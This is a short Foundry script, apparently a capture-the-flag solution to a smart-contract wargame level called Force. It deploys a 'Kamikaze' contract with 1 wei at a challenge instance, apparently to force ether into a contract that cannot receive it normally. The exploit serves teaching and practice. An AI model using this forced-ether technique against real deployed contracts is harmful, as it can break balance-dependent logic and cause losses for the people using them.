// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Kamikaze} from "../src/07_Force.sol";

contract PoC is Script {
    address payable immutable force =
        payable(0xD0350fE26d963C9B0974Cab2b5a55D72B02566a3); // Replace with your Force instance

    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        new Kamikaze{value: 1 wei}(force);

        vm.stopBroadcast();
    }
}
